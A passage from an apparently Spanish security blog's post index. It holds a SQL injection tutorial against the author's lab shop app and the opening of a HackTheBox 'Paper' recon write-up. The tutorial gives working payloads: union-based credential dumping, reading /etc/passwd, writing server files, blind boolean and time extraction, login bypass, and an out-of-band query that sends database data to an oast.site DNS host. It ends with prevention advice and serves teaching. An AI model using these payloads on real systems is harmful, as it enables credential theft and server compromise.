\"&lt;table&gt;\";\techo \"&lt;tr&gt;\";\techo \" &lt;th align='left'&gt; ID &lt;/th&gt;\";\techo \" &lt;th align='left'&gt; Producto &lt;/th&gt;\";\techo \" &lt;th align='left'&gt; Descripcion &lt;/th&gt;\";\techo \"&lt;/tr&gt;\";\techo \"&lt;tr&gt;\";\techo \"&lt;td align='left'&gt; \" . $rows['id'] . \"&lt;/td&gt;\";\techo \"&lt;td align='left'&gt; \" . $rows['nombre'] . \"&lt;/td&gt;\";\techo \"&lt;td align='left'&gt; \" . $rows['descripcion'] . \"&lt;/td&gt;\";\techo \"&lt;/tr&gt;\";\techo \"&lt;/table&gt;\";}?&gt;Explotación de las inyecciones SQLEn este apartado pretendo explicar la explotación de todos los tipos de inyecciones SQL, realmente todas se basan en los mismos principios y objetivos por lo que me extenderé más en la explicación del primer tipo (Union Based), ya que los conceptos de sacar información y explotación de privilegios los podemos extrapolar a los demás tipos de inyecciones.Tenéis a vuestra disposición varias herramientas que automatizan la explotación de las inyecciones SQL, sin embargo, yo recomiendo que aprendáis a explotarlas por vostros mismos ya que no siempre vais a tener estas herramientas a mano, además siempre está bien aprender nuevas cosas.Union BasedAntes de comenzar a explotar la inyección tendremos que comprobar si realmente estamos ante una posible inyección SQL de este tipo, esto lo podemos hacer inyectando código en la consulta. Podemo ver si estamos ante una inyección SQL de este tipo con el siguiente payload 1' UNION SELECT 1-- -. Con esta consulta pueden pasar 3 cosas: Que añada el dato de la segunda consulta SELECT sin dar errores Que nos salte el siguiente error: The used SELECT statements have a different number of columns Que no ocurra nadaSi nos ocurre cualquiera de los dos primeros casos significará que estamos ante una inyección SQL ya que hemos sido capaces de unir las salidas de dos consultas SELECT utilizando una consulta UNION.A priori parece que solo podemos introducir datos dentro del campo del nombre, sin embargo, como hemos visto antes podemos añadir una comilla a la consulta para cerrar el campo, por lo que todo lo que escribamos luego de la comilla quedará fuera de él.Por ejemplo, si hacemos esto vamos a ser capaces de inyectar código fuera de los limites del campo, introduzcamos en la consulta el siguiente payload 1' UNION SELECT 1, 2, 3-- -.Conseguimos inyectar código SQLVemos que hemos sido capaces de inyectar código fuera de los limites del campo del nombre, ahora pasaremos a explicar como combinar los resultados de varias consultas SELECT utilizando la orden UNION.Para que podamos hacer esto es necesario que ambas consultas SELECT tengan el mismo número de columnas y que almacenen el mismo tipo datos. Cuando queramos poner en practica este tipo de inyección SQL descubriremos que la consulta original no tendrá misma cantidad de columnas que nuestra consulta, por lo que tendremos que arreglarlo.Supongamos que la consulta original tiene 3 columnas y la nuestra solamente tiene 2, por lo que tendremos que conseguir de alguna manera que nuestra consulta tenga 3 columnas. Aquí es donde entran los datos basura, los datos basura son aquellos que utilizamos para conseguir tener el mismo número de columnas en ambas consultas SELECT.Vamos a hacer una consulta SELECT con 2 columnas que uniremos a la otra consulta SELECT mediante la orden UNION. Nuestro payload sería el siguiente 1' UNION SELECT nombre, contraseña FROM Usuarios-- -.Error debido a que las consultas SELECT no tienen el mismo número de columnasVemos que nos da un error debido a que no tenemos el mismo número de columnas en las dos consultas SELECT (3 columnas y 2 respectivamente), ya que necesitamos de una columna en nuestra consulta para igualar a la original vamos a utilizar los datos basura para añadir una columna más, quedando nuestro payload así 1' UNION SELECT nombre, contraseña, 3 FROM Usuarios-- -Utilizamos los datos basura para conseguir el mismo número de columnasYa sabemos que necesitamos tener las mismas columnas en las dos consultas SELECT para crear una consulta dentro de la principal con la orden UNION, en el ejemplo anterior nosotros ya sabiamos cuantas columnas necesitabamos, sin embargo, cuando queramos poner en práctica esto en otros entornos controlados no vamos a saber cuantas columnas vamos a necesitar, aquí entra en juego la orden ORDER BY.La orden ORDER BY nos sirve para realizar un ordenamiento de los datos, nosotros como atacantes nos podemos aprovechar de esto pidiendole que nos ordene los datos a partir de ciertas columnas, por lo que si le pedimos que nos ordene por la quinta columna cuando la tabla solo tiene 4 columnas nos saltará un error. De esta forma vamos probando hasta encontrar un número con el cual no provocamos un error y que el siguiente si lo provoque.Vamos a descubrir cuantas columnas tiene la tabla Productos utilizando la orden ORDER BY, probemos primero con 4 columnas, quedando nuestro payload así 1' ORDER BY 4-- -Error debido a que la tabla no tiene ese número de columnasVemos que nos da un error por lo que el número de columnas tiene que ser menor que 4, probemos ahora con 3 columnas.Encontramos el número de columnas que tiene la tablaAhora no nos saltará un error por lo que ya sabemos que la tabla tiene 3 columnas ya que el número siguiente nos da error y este no. Ya sabiendo la cantidad de columnas que tiene la tabla vamos a empezar a recopilar información básica sobre la base de datos antes de empezar con la explotación. Información a obtener Software Consulta Nombre de la base de datos Todos database() Versión de la base de datos MySQL @@version   Oracle v$verrsion   PostgreSQL version() Usuario que la está corriendo Todos user() Como solo necesitamos 3 columnas vamos a introducir 3 consultas para conseguir información, así que no vamos a utilizar datos basura para conseguir más columnas. Vamos a mandar el siguiente payload 1' UNION SELECT database(), @@version, user()-- -.Recopilación de información BásicaYa hemos recopilado información que nos puede ser útil, ahora voy a pasar a explicar la explotación de la inyecciones SQL de tipo Union Based.Lo primero de todo, necesitaremos saber que bases de datos existen. Esto lo podemos averiguar consultando la columna llamada schema_name de la tabla schemata de la base de datos information_schema. Nuestro payload quedaría así 1' UNION SELECT schema_name, 2, 3 FROM information_schema.schemata-- -Bases de datos existentesLas tres primeras bases de datos no nos interesan ahora mismo, veamos que tablas contiene la base de datos llamada Tienda. Nuestro payload para sacar las tablas quedaría así 1' UNION SELECT table_name, 2, 3 FROM information_schema.tables WHERE table_schema=\"Tienda\"-- -.Tablas existentesVamos a sacar las columnas existentes en la tabla de Usuarios con el siguiente payload 1' UNION SELECT column_name FROM information_schema.columns WHERE table_schema=\"Tienda\" AND table_name=\"Usuarios\"-- -Columnas existentesYa sabemos que columnas tiene la tabla de Usuarios, por lo que vamos a proceder a sacar toda la información. Sin embargo, vemos que tenemos que sacar 4 columnas pero la consulta original solo tiene 3 por lo que vamos a tener que recurrir a una concatenación con la orden concat, quedando así nuestro payload 1' UNION SELECT CONCAT(id,0x3a,nombre,0x3a,contraseña,0x3a,rol), 2, 3 FROM Tienda.Usuarios-- - (0x3a es igual a “:” en hexadecimal).Datos existentesYa tenemos las credenciales de los usuarios, parecería que ya no podemos hacer mucho más con la base de datos, pero esto no es así ya que por ejemplo, podemos intentar ver si el usuario que está corriendo la base de datos tiene permisos de lectura/escritura, si fuera así podríamos leer archivos del servidor e incluso dejar una puerta trasera que nos de acceso directo al servidor.Para poder leer archivos del servidor necesitaremos que nuestro usuario tenga el privilegio FILE asignado. Podemos ver si tenemos ese privilegio asignado con el siguiente payload 1' UNION SELECT grantee, privilege_type, 3 FROM information_schema.user_privileges WHERE privilege_type=\"FILE\"-- -.Privilegios de nuestro usuarioVemos que el usuario que está corriendo la base de datos es el mismo que tiene el privilegio FILE, por lo que vamos a ser capaces de leer archivos. Lo haremos utilizando la orden LOAD_FILE, esta orden toma como argumento el archivo que queramos leer, vamos a intentar leer el /etc/passwd con el siguiente payload 1' UNION SELECT LOAD_FILE(\"/etc/passwd\"), 2, 3-- -.Lectura de archivosYa hemos conseguido leer archivos del servidor ahora vamos a ver que necesitamos para escribirlos. Para poder escribir archivos del lador del servidor necesitamos tres cosas: Usuario con privilegio FILE habilitado Variable secure_file_priv no habilitada Acceso de escritura en la ubicación en la que queramos escribir.Al revisar si somos capaces de leer archivos en el servidor hemos consultado si nuestro usuario tenía asignado el privilegio FILE, por lo que no es necesario que lo volvamos a consultar.Ya sabemos que contamos con los privilegios necesarios, ahora vamos a ver si la variable secure_file_priv está activada. Esta variable se utiliza para determinar desde donde podemos leer/escribir archivos. Un valor vacío en esta variable nos indica que podemos leer/escribir en todo el sistema de archivos. Vamos a revisar su valor con el siguiente payload 1' UNION SELECT variable_name, variable_value, 3 FROM information_schema.global_variables WHERE variable_name=\"secure_file_priv\"-- -.Valor de la variableVemos que la variable SECURE_FILE_PRIV no tiene ningún valor asignado por lo que podremos leer/escribir desde cualquier parte del sistema de archivos siempre que tengamos los permisos necesarios para leerlos/crearlos, esto lo haremos con la orden INTO OUTFILE quedando así nuestro payload 1' UNION SELECT \"Esto es una prueba\", \"\", \"\" INTO OUTFILE \"/tmp/prueba.txt\"-- -.❯ cat /tmp/prueba.txtEsto es una pruebaYa hemos conseguido crear y escribir archivos del lado del servidor, yo en este caso he escrito un texto cualquiera para la demostración pero podemos llegar a poner puertas traseras que nos den acceso al servidor.Error BasedLas inyecciones SQL de tipo Error Based consisten en provocar a propósito un error en la consulta para conseguir de esta forma listar datos desde la salida del propio error.Lo primero que haremos será comprobar si realmente estamos ante una inyección SQL de tipo Error Based, esto lo podemos hacer inyectando algún payload en la consulta para ver si conseguimos producir un error. Payload Codificado URL ’ %27 ” %22 # %23 ; %3B ( %28 ) %29 Detectamos que estamos ante una inyección SQL de tipo Error BasedTenemos a nuestra disposición una gran cantidad de formas para producir errores, sin embargo, no todas las formas sirven para las mismas situaciones. Sabiendo esto, necesitaremos conseguir información sobre la base de datos utilizada, para de esta forma utilizar el payload correcto que causara el error que necesitamos.Si nos fijamos bien en el mensaje de error que hemos recibido antes nos encontremos que el error nos está proporcionando información acerca de la base de datos. Información acerca del gestor de bases de datos utilizado: Mariadb Que causó el error: comilla simple (‘) En que parte de la consulta ocurrió el error: (teclado’)Ya sabemos que se está utilizando Mariadb como gestor de bases de datos, por lo que podemos reducir los payloads a utilzar. Como se está utilizando Mariadb vamos a utiliazar el siguiente payload adaptado para Mariadb: 1' AND EXTRACTVALUE('',CONCAT('=',database()))-- -Este payload convierte una cadena (resultado de database()) en un número entero, lo que generará un error que contendrá el contenido de la cadena a convertir. Utilizamos la función CONCAT para añadir al principio de la cadena el signo igual. En caso de que los primeros caracteres de la cadena sean válidos para convertirlos (números enteros) la cadena no se mostrara en el error, el añadir el signo igual evita esto.Conseguimos saber el nombre de la base de datos actualComo veis hemos sido capaces de averiguar el nombre de la base de datos actual a través de la salida del error. Ahora vamos a intentar saber las tablas existentes, lo haremos con el siguiente payload 1' AND EXTRACTVALUE('',CONCAT('=',(SELECT table_name FROM information_schema.tables WHERE table_schema=\"Tienda\" LIMIT 0,1)))-- -. Recalco que en este tipo de inyección SQL solamente podemos conseguir una columna por consulta SELECT, aun así como estamos usando la función CONCAT podemos añadir más consultas SELECT.Conseguimos saber el nombre de una de las tablasYa si queremos saber el nombre de las columnas y los datos que contienen estas tendremos que hacerlo como en las de tipo UNION BASED, con la única diferencia de que no son necesarios los datos basura ni la orden UNION y que necesitamos el uso de la orden LIMIT.Boolean BasedAntes de explicar nada, vamos a necesitar realizar unas modificaciones al codigo de nuestra aplicación web. Los cambios consistiran en comentar el código con el que mostramos los resultados de la consulta, además, añadiremos una línea que nos diga cuando la consulta se ha realizado de una forma correcta:// Obtenemos y mostramos ls resultados de la consulta. Los resultados se almacenan en un array por el cual iteramoswhile ($rows = mysqli_fetch_assoc($results)) {//\techo \"&lt;table&gt;\";//\techo \"&lt;tr&gt;\";//\techo \" &lt;th align='left'&gt; ID &lt;/th&gt;\";//\techo \" &lt;th align='left'&gt; Producto &lt;/th&gt;\";//\techo \" &lt;th align='left'&gt; Descripcion &lt;/th&gt;\";//\techo \"&lt;/tr&gt;\";//\techo \"&lt;tr&gt;\";//\techo \"&lt;td align='left'&gt; \" . $rows['id'] . \"&lt;/td&gt;\";//\techo \"&lt;td align='left'&gt; \" . $rows['nombre'] . \"&lt;/td&gt;\";//\techo \"&lt;td align='left'&gt; \" . $rows['descripcion'] . \"&lt;/td&gt;\";//\techo \"&lt;/tr&gt;\";//\techo \"&lt;/table&gt;\";\techo \"La consulta se ha realizado correctamente\";}Como he explicado en el apartado de tipos de inyecciones SQL, las inyecciones de tipo Boolean Based utilizan los condicionales para modificar la respuesta del servidor de esta forma consiguiendo saber si un dato es correcto o no.Lo primero que necesitaremos es comprobar si realmente estamos ante una inyección SQL de este tipo, esto lo podemos hacer inyectando código en la consulta. Lo que haremos será inyectar un operador lógico AND seguido de una expresión que nunca sea cierta, como por ejemplo 1=2. Veremos que no nos da respuesta el servidor, si es así probaremos con una expresión que siempre sea cierta como por ejemplo 1=1. Si nos da respuesta el servidor significará que estamos ante una inyección SQL de tipo Boolean Based.Cabe recalcar que necesitamos que la primera expresión del AND devuelva TRUE, es decir, que el dato de la primera expresión se encuentre en la base de datos. Si no conocemos algún dato que este en la base de datos podemos utilizar un OR aunque recomiendo utilizar mejor el AND.No nos respondela p ginaNos responde la páginaYa sabiendo que estamos ante una inyección SQL de tipo Boolean Based voy a explicar la explotación de esta. Para el ejemplo vamos a utilizar el siguiente payload teclado' AND SUBSTR(database(),1,1)=\"t\"-- -Con este payload estamos comparando la primera letra de la base de datos actual (Tienda) con la letra “t” (es Case Insensitive), si esta comparación nos devuelve un valor TRUE nos contestará de una forma normal, de no ser así asi el servidor no nos contestara. Basandonos en esto ya vamos a saber si la letra es válida según si nos responde o no.Ya tenemos la primera letra del nombre de la base de datos actual, ahora tendremos que conseguir la segunda, para ello utilizaremos el siguiente payload teclado' AND SUBSTR(database(),2,1)=\"t\"-- -, daos cuenta que he variado el número que hace referenca a la letra que se quiere evaluar en este caso ahora vamos a evaluar la segunda letra de la base de datos (i).Tras muchas consultas encontraremos que el nombre de la base de datos es “Tienda”, si queremos conseguir otros datos lo que tendremos que hacer es cambiar el valor de la string de la que vamos a sacar la letra. Por ejemplo, ahora vamos a sacar una tabla de la base de datos actual, esto lo haríamos con el siguiente payload teclado' AND SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=\"Tienda\" LIMIT 0,1),1,1)=\"p\"-- -.Si nos fijamos, la string que vamos a comparar con las letras y que conseguimos a través de la consulta SELECT es muy parecida a las que hacíamos con las de tipo UNION BASED, con la diferencia de que en estas no vamos a necesitar utilizar los datos basura ni la orden UNION y de que en estas necesitamos utilizar la orden LIMIT.De nuevo, tras muchas consultas encontraremos que la el nombre de la primera tabla es Productos, si queremos conseguir el nombre de la otra simplemente variaremos la variable que limita los resultados de la función LIMIT, vamos a conseguir el nombre de la otra tabla con el siguiente payload teclado' AND SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=\"Tienda\" LIMIT 1,1),1,1)=\"u\"-- -.Ya si queremos conseguir el nombre de las columnas y los valores que almacenan estas es exactamente igual que en las de tipo UNION BASED, con la diferencia de los datos basura, la orden UNION y la orden LIMIT.Quiero recalcar que podemos variar la forma del payload, en nuestro ejemplo vamos comparando letra por letra pero podemos hacerlo de otras maneras, como por ejemplo probando palabras enteras. Si queremos hacerlo utilizando palabras directamente podemos hacerlo con el siguiente payload teclado' AND database()=\"Tienda\"-- -. En ambos métodos recomiendo que os hagáis un script para agilizar el proceso pues se os puede llegar a hacer pesado si lo hacéis manualmente.Time BasedComo en las inyecciones SQL de tipo Boolean Based necesitamos hacer un cambio en el código, en este caso simplemente tendremos que comentar la línea que nos indica que la consulta se ha realizado correctamente.// Obtenemos y mostramos ls resultados de la consulta. Los resultados se almacenan en un array por el cual iteramoswhile ($rows = mysqli_fetch_assoc($results)) {//\techo \"&lt;table&gt;\";//\techo \"&lt;tr&gt;\";//\techo \" &lt;th align='left'&gt; ID &lt;/th&gt;\";//\techo \" &lt;th align='left'&gt; Producto &lt;/th&gt;\";//\techo \" &lt;th align='left'&gt; Descripcion &lt;/th&gt;\";//\techo \"&lt;/tr&gt;\";//\techo \"&lt;tr&gt;\";//\techo \"&lt;td align='left'&gt; \" . $rows['id'] . \"&lt;/td&gt;\";//\techo \"&lt;td align='left'&gt; \" . $rows['nombre'] . \"&lt;/td&gt;\";//\techo \"&lt;td align='left'&gt; \" . $rows['descripcion'] . \"&lt;/td&gt;\";//\techo \"&lt;/tr&gt;\";//\techo \"&lt;/table&gt;\";//\techo \"La consulta se ha realizado correctamente\";}Las inyecciones SQL de tipo Time Based son muy parecidas a las de tipo Boolean Based, la única diferencia entre ellas radica en la forma en la que conseguimos detectar si nuestro payload es correcto. Para detectar si nuestro payload es correcto o no utilizaremos condicionales que retrasaran la respuesta del servidor.Lo primero que necesitaremos es comprobar si realmente estamos ante una inyección SQL de este tipo, esto lo podemos hacer inyectando código en la consulta, quedando nuestro payload así teclado' and sleep(5)-- -. Cabe recalcar que como en las de tipo Boolean Based necesitamos que la primera expresión de AND devuelva un valor TRUE.Si el servidor espera 5 segundos antes de darnos una respuesta es que nos encontramos ante una inyección SQL de tipo Time Based, a continuación voy explicar la explotación de esta. Para el ejemplo vamos a utiliar el siguiente payload teclado' AND IF(SUBSTR(database(),1,1)=\"t\", sleep(5),1)-- -.Con este payload estamos comparando la primera letra de la base de datos actual (Tienda) con la letra “t” (es Case Insensitive), si esta comparación nos devuelve un valor TRUE esperará 5 segundos, de no ser así no esperará. Con este payload el servidor esperará 5 segundos por que la letra “t” es la primera de la base de datos actual, si esta no fuera la primera letra tendremos que ir cambiando continuamente la letra hasta encontrar la que hace que el servidor retrase su respuesta. Ya tenemos la primera letra de la base de datos actual, ahora tendremos que conseguir la segunda, para ello utilizaremos el siguiente payload teclado' AND IF(SUBSTR(database(),2,1)=\"i\", sleep(5),1)-- -, notese que he variado el número que hace referencia a la letra que se quiere evaluar en este caso ahora vamos a evaluar la segunda letra de la base de datos (i).Tras muchas consultas encontraremos que el nombre de la base de datos actual es “Tienda”, si queremos conseguir otros datos lo que tendremos que hacer es cambiar el valor de la string de la que vamos a sacar la letra. Por ejemplo, ahora vamos a sacar una tabla de la base de datos actual, esto lo haríamos con el siguiente payload teclado' AND IF(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=\"Tienda\" LIMIT 0,1),1,1)=\"p\",sleep(5),1)-- -. Si nos fijamos, la string que vamos a comparar con las letras y que conseguimos a través de la consulta SELECT es muy parecida a las que hacíamos con las de tipo UNION BASED, con la diferencia de que en estas no vamos a necesitar utilizar los datos basura ni la orden UNION y que vamos a necesitar utilizar la orden LIMIT.De nuevo, tras muchas consultas encontraremos que la el nombre de la primera tabla es Productos, si queremos conseguir el nombre de la otra simplemente variaremos la variable que limita los resultados de la función LIMIT, vamos a conseguir el nombre de la otra tabla con el siguiente payload teclado' AND IF(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=\"Tienda\" LIMIT 1,1),1,1)=\"u\",sleep(5),1)-- -.Ya si queremos conseguir el nombre de las columnas y los valores que almacenan estas es exactamente igual que en las de tipo UNION BASED, con la diferencia de los datos basura y la orden LIMIT.Quiero recalcar que podemos variar la forma del payload, en nuestro ejemplo vamos comparando letra por letra pero podemos hacerlo de otras maneras, como por ejemplo probando palabras enteras. Si queremos hacerlo utilizando palabras directamente podemos hacerlo con el siguiente payload teclado' and if(database()=\"Tienda\", sleep(5),1)-- -. En ambos métodos recomiendo que os hagáis un script para agilizar el proceso pues se os puede llegar a hacer pesado si lo hacéis manualmente.Out-of-bandEste tipo de inyecciones se dan cuando no somos capaces de conseguir la salida de la consulta de ninguna forma posible y además tenemos la capacidad de generar peticiones HTTP(S) o DNS.Para explotar este tipo de inyecciones SQL necesitaremos no tener la variable secure_file_priv habilitada, para consultar su valor tendremos que utilizar una consulta explotando este tipo de inyección, por lo que no será necesario consultar su valor ya que si somo capaces de hacerlo es por que no está habilitada.Para explotar este tipo de inyección SQL necesitaremos una herramienta que utilizaremos para interceptar la información que mandamos a través de consultas HTTP(S) o DNS, yo voy a utilizar la herramienta interactsh, os dejo su repositorio de github y un video para aprender a usarla.Iniciaremos la herramienta, al iniciarla nos proporcianaran un dominio al que tendremos que enviar las peticiones DNS o HTTP(S). Vamos a sacar la versión de la base de datos, el usuario que está corriendo la base de datos y la base de datos en uso. Os dejo un estudio en el que explotan este tipo de inyección SQL según la base de datos utilizada, en nuestro caso, utilizaremos el siguiente payload teclado' UNION SELECT 1, 2, LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.',(SELECT user()),'.', (SELECT database()),'.','cb69n4j0744r7nrac3k0p8anqgpwzkhsc.oast.site\\\\vfw'))-- - (teneis que cambiar el dominio por el que os hayan proporcionado).[10.5.12-MariaDB-0+deb11u1.xdann1.Tienda.cb69n4j0744r7nrac3k0p8anqgpwzkhsc] Received DNS interaction (AAAA) from 85.62.233.105 at 2022-07-11 22:16:09De esta forma hemos conseguido enviar una solicitud DNS a un dominio el cual tiene de subdominios la salida de las consultas SELECT. Si queremos conseguir otros datossimplemente tendremos que cambiar las consultas SELECT.Paneles de LoginSoy consciente de que esto no es un tipo de inyección SQL pero creo que se merece un apartado para explicar distintas formas de explotarlos.Para que un panel de login nos de acceso necesitaremos que la consulta devuelva un valor TRUE, es decir, que el usuario y la contraseña sean correctas. No nos sirve que el usuario sea correcto y que la contraseña sea incorrecta, por lo que deducimos no está utilizando un OR y que en cambio, está utilizando un AND. Deducimos que la consulta que se hace a la base de datos es parecida a la siguiente:SELECT * FROM Usuarios WHERE usuario='[input usuario]' AND contraseña='[input usuario]';Si quisieramos iniciar sesión en nuestro panel de login tendríamos que dar unas credenciales válidas, vamos a ver como se haría esto desde un punto de vista lógico.Panel del Login visto de una forma LógicaVemos que ambas expresiones del AND tienen valores TRUE por lo que el valor de la consulta se convierte en TRUE, dandonos acceso al panel del usuario en cuestión. Como hemos visto en los otros tipos de inyecciones SQL hemos sido capaces de inyectar código en la consulta para que nos lo interprete, de esta forma consiguiendo subvertir la lógica de la consulta. Pues esto mismo vamos a hacer, tenemos dos formas principales para hacer esto, voy a pasar a explicarlas.La primera de ellas consiste en utilizar los comentarios para subvertir la lógica de la consulta. Existen varias formas de comentar en SQL: (#): es preferible poner mejor la forma codificada en url (%23) ya que de la forma normal lo toma como una etiqueta. (– ): es necesario un espacio luego de los dos guiones, por lo que necesitaremos poner un guion después del espacio ya que si no lo hacemos no nos interpretara el espacio. (/* */): no suele usarse en inyecciones SQL.Las dos primeras formas son las más utilizadas para las inyecciones SQL. La función de los comentarios será la de hacer que se ignore parte de la consulta, subvirtiendo la lógica de la consulta.Lo malo de este tipo de inyección en los paneles de login es que necesitaremos saber de un usuario existente para llevarla a cabo, vamos a verlo de una forma más sencilla a través de una imagen.Inyección SQL a través de ComentariosComo la consulta nos devuelve un valor TRUE nos dará accesso al panel del usuario. Esta es una buena forma de saltarse un login pero tiene la falla de que necesitamos saber de un usuario existente, aquí entra la otra forma, utilizando el operador lógico OR.Utilizando el operador lógico OR de manera correcta conseguiremos que ambas expresiones del AND (usuario y contraseña) nos devuelvan un valor TRUE. Vamos a aprovechar que el operador OR nos devuelve un valor TRUE cuando una de las expresiones tenga un valor TRUE, de esta forma conseguiremos que ambas expresiones del AND tengan un valor TRUE, vamos a ver la consulta mejor de una forma lógica.Inyección SQL a través del operador ORVemos que finalmente la consulta nos devuelve un valor TRUE (notese el orden de las operaciones, como en matemáticas), por lo que nos dará acceso al panel del usuario. Si nos fijamos hemos puesto unas credenciales que no coinciden con ninguna almacenada en la base de datos, sin embargo, la consulta nos ha devuelto un valor TRUE por lo que nos dara acceso a la cuenta del primer usuario que por lo general es el administrador.Os dejo un repositorio de github en el que han recopilado una gran cantidad de payloads para bypasear paneles de login.Prevención inyecciones SQLLas inyecciones SQL generalmente son causadas por aplicaciones web mal codificadas o privilegios de bases de datos y servidores back-end mal configurados. Existen varias formas de reducir las posibilidades de ser vulnerable a las inyecciones de SQL a través de métodos de codificación seguros, como la desinfección y validación de la entrada del usuario, controles adecuados de los privilegios y usuarios del back-end y el uso de consultas parametrizadas.La inyección se puede evitar desinfectando cualquier entrada del usuario, lo que hace que las consultas inyectadas sean inútiles. Esto lo podemos lograr de dos formas: Las bibliotecas proporcionan múltiples funciones para lograr esto, un ejemplo de ello es la función mysqli_real_escape_string(). Esta función escapa caracteres como (‘) y (“), por lo que cuando un usuario los introduzca no serán interpretados como código sino como una cadena. Utilizando expresiones regulares que limiten algunos caracteres, como el input del campo nombre solamente puede componerse por letras podemos restringir la entrada a solo estos caracteres, lo que evitará la inyección de caracteres especiales como (‘) y (“).Las entradas de datos también se pueden validar en función de los datos a consultar para garantizar que coincida con la estructura de la entrada esperada. Por ejemplo, si solicitamos un correo electrónico al usuario, podemos filtrar que el input tenga una estructura igual a la siguiente “usuario@dominio.com”.Además es una buena práctica hacer uso de las consultas parametrizadas, usandolas no concatenamos directamente el valor de la variable de la entrada del usuario a la consulta SQL sino que primero pasamos a la consulta SQL un conjunto de parametros que luego escaparán la entrada del usuario.Debemos asegurarnos de que el usuario que realiza las consultas en la base de datos tenga los permisos mínimos, a esto se le conoce en el mundo de la ciberseguridad como “Principio del Mínimo Privilegio”. Los usuarios administradores bajo ningún concepto deben realizar las consultas a la base de datos ya que al ser administradores tienen permisos que podrían comprometer el servidor." }, { "title": "Paper Writeup", "url": "/posts/writeup-paper/", "categories": "Writeup, HTB", "tags": "Linux, CTF, Easy, CVE, Wordpress, LFI", "date": "2022-06-18 00:00:00 +0200", "snippet": "Máquina Easy, nos aprovechamos de un filtrado de información para acceder a un subdominio el cual tiene una vulnerabilidad que nos permite ver información oculta, conseguimos autenticarnos contra un chat en el que nos aprovechamos de un bot para conseguir unas credenciales, por último encontramos un exploit público para escalar privilegios.Recopilación de InformaciónPrimero vamos a comprobar la conectividad con la máquina.❯ ping -c 1 10.10.11.143PING 10.10.11.143 (10.10.11.143) 56(84) bytes of data.64 bytes from 10.10.11.143: icmp_seq=1 ttl=63 time=97.5 ms--- 10.10.11.143 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 97.458/97.458/97.458/0.000 msEn la salida del comando anterior se puede ver un parámetro llamado ttl, gracias a este parámetro podemos saber que sistema operativo está corriendo en la máquina víctima. GNU/Linux = TTL 64 Windows = TTL 128En este caso, el sistema operativo que está corriendo en la máquina víctima es GNU/Linux.Vamos a usar la herramienta nmap para descubrir que puertos están abiertos y que servicios estan asociados a estos.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.143 -oG allPorts -p- &gt; Escanea todos los puertos (65535) –open &gt; Muestra solo los puertos con un estatus “open” -sS &gt; Aplica un TCP SYN Scan –min-rate 5000 &gt; Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo -vvv &gt; Muestra la información en pantalla a medida que se descubre -n &gt; Indica que no aplique resolución DNS -Pn &gt; Indica que no aplique el protocolo ARP 10.10.11.143 &gt; Dirección IP que se quiere escanear -oG allPorts &gt; Exporta el output a un fichero grepeable con nombre “allPorts”Este sería el output del escaneo:Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-18 00:12 CESTScanning 10.10.11.143 [65535 ports]PORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 6380/tcp open http syn-ack ttl 63443/tcp open https syn-ack ttl 63Ahora vamos a realizar un escaneo más profundo, también con nmap pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.❯ nmap -p22,80,443 -sC -sV 10.10.11.143 -oN targeted -p22,80,443 &gt; Indica los puertos que se quieren escanear -sC &gt; Lanza scripts básicos de enumeración -sV &gt; Enumera la versión y servicio que está corriendo en los puertos 10.10.11.143 &gt; Dirección IP que se quiere escanear -oN targeted &gt; Exporta el output a un fichero en formato nmap con nombre “targeted”Este sería el output del escaneo:Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-18 00:19 CESTNmap scan report for 10.10.11.143PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.0 (protocol 2.0)| ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)| 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)|_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)| http-methods: |_ Potentially risky methods: TRACE|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28|_http-title: HTTP Server Test Page powered by CentOS|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9443/tcp open ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)|_http-title: HTTP Server Test Page powered by CentOS| http-methods: |_ Potentially risky methods: TRACE|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28| tls-alpn: |_ http/1.1| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US| Subject Alternative Name: DNS:localhost.localdomain| Not valid before: 2021-07-03T08:52:34|_Not valid after: 2022-07-08T10:32:34|_ssl-date: TLS randomness does not represent time|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9Los puertos abiertos y sus servicios asocidados son: 22/tcp &gt; ssh 80/tcp &gt; http 443/tcp &gt; httpsAl entrar a la página web alojada en el puerto 80 y en el puerto 443 nos encontramos con la página por defecto que tiene Apache. Ahora podríamos intentar hacer un reconocimiento de rutas con dirsearch, utilizaremos fuerza bruta para enumerar rutas potenciales.❯ dirsearch -u http://10.10.11.143/ -x 403 -u http://10.10.11.143/ &gt; Indica la URL a la que se le van a hacer las peticiones -x 403 &gt; Oculta las peticiones con un código de estadoLas rutas que hemos hallado son los siguientes:Target: http://10.10.11.143/[01:35:17] Starting: [01:35:23] 301 - 233B - /.npm -&gt; http://10.10.11.143/.npm/[01:35:23] 200 - 171B - /.npm/anonymous-cli-metrics.json[01:35:51] 404 - 16B - /composer.phar[01:36:03] 404 - 16B - /index.php/login/[01:36:09] 301 - 235B - /manual -&gt; http://10.10.11.143/manual/[01:36:09] 200 - 9KB - /manual/index.html[01:36:15] 404 - 16B - /php-cs-fixer.phar[01:36:18] 404 - 16B - /phpunit.pharBusqueda de vulnerabilidadesTenemos una ruta que me resulta curiosa, la 